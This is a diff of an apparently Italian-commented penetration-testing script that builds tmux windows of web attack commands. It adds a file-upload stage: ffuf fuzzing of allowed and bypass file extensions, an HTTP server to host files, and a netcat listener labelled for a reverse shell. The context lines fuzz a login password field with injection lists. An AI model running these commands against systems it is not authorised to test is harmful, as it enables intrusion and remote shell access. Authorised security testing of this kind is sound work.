@@ -3419,8 +3419,6 @@ tmux send-keys -t PT:7.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-T
 cd $folderProject
 
 
-
-
 # WEB SSTI
 cd $folderProjectWebAuthN
 # Layout
@@ -3451,6 +3449,26 @@ tmux send-keys -t PT:8.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-T
 tmux send-keys -t PT:8.6 "# SSTI automation (POST)" Enter
 tmux send-keys -t PT:8.6 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
 
+
+# File Upload
+cd $folderProjectWebAuthN
+# Layout
+tmux new-window -t PT:9 -n 'File Upload'
+tmux split-window -v -t PT:9.0
+tmux resize-pane -t PT:8.0 -y 3
+tmux split-window -v -t PT:9.1
+tmux split-window -v -t PT:9.2
+tmux select-pane -t "9.2"
+tmux split-window -h -t "9.2"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:9.0 "# File Upload: test allowed extension (filename=""FileToBeUploaded.FUZZ"")" Enter
+tmux send-keys -t PT:9.0 "ffuf -request upload.req -request-proto http -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -mr <Message displayed upon successful upload>"
+tmux send-keys -t PT:9.1 "# File Upload: test allowed extension with bypass techniques (filename=""FileToBeUploadedFUZZ"")" Enter
+tmux send-keys -t PT:9.1 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-ext-list.txt -fl 120"
+tmux send-keys -t PT:9.2 "# activate listener HTTP" Enter
+tmux send-keys -t PT:9.2 "python3 -m http.server 80"
+tmux send-keys -t PT:9.3 "# activate listener for reverse shell on port 9001" Enter
+tmux send-keys -t PT:9.3 "nc -nlvp 9001"
 
 
 
